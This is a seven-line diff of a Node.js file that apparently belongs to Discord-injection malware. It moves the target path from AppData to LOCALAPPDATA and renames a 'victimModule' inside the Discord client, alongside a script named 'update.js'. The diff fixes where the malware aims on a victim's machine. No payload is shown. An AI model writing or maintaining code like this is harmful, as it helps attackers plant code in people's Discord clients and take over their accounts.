@@ -1,7 +1,7 @@
 const fs = require('fs');
 const utils = require('./utils');
-const discordPath = process.env.AppData + '/Discord';
-const victimModule = 'discord_utils';
+const discordPath = process.env.LOCALAPPDATA + '/Discord';
+const victimModule = 'discord_utils-1/discord_utils';
 const scriptName = 'update.js';
 
 
